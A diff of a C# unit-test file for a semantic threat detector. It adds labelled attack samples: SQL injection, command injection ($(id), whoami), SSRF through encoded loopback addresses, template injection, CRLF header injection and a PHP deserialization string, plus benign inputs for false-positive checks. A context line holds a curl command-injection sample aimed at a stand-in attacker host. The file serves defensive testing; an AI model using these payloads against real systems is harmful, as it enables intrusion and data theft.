@@ -10,6 +10,17 @@ public sealed class SemanticThreatDetectorTests
 
     public static TheoryData<string, string, string> AttackSamples => new()
     {
+        { "query", "1 and 2=2", "SQL注入" },
+        { "body", "1 AND extractvalue(1,concat(0x7e,version()))", "SQL注入" },
+        { "body", "$(id)", "命令注入" },
+        { "body", "value\nwhoami", "命令注入" },
+        { "query", "http://2130706433/admin", "SSRF" },
+        { "query", "http://0x7f000001/admin", "SSRF" },
+        { "query", "http://127.1/admin", "SSRF" },
+        { "body", "{{8*8}}", "模板/表达式注入" },
+        { "header", "value\r\nX-Injected: yes", "CRLF" },
+        { "body", "value\nX-Injected: yes", "CRLF" },
+        { "header", "q=O:8:\"Exploit\":1:{s:1:\"x\";s:1:\"y\";}", "PHP反序列化" },
         { "query", "' OR 1=1", "SQL注入" },
         { "query", "1 UNION ALL SELECT password FROM users", "SQL注入" },
         { "body", "; curl http://attacker.invalid/a", "命令注入" },
@@ -45,6 +56,11 @@ public sealed class SemanticThreatDetectorTests
 
     [Theory]
     [InlineData("select a delivery option")]
+    [InlineData("http://134744072/public")]
+    [InlineData("line one\nline two")]
+    [InlineData("$(price)")]
+    [InlineData("items 1 and 2")]
+    [InlineData("{{ username }}")]
     [InlineData("This article explains union membership")]
     [InlineData("https://example.com/callback")]
     [InlineData("user@example.com")]
